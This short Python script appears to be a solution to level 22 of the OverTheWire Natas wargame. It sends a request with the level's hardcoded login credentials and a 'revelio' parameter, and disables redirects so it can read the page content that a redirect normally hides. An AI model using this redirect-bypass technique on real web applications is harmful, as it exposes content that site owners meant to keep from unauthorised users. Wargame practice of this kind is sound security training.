
import requests
from requests.auth import HTTPBasicAuth

HOST = 'http://natas22.natas.labs.overthewire.org/index.php?debug=1'
Auth = HTTPBasicAuth('natas22', 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ')
para = dict(revelio=1)

r = requests.get(HOST, auth=Auth, params=para,allow_redirects=False)
print(r.text)

print(r.text)

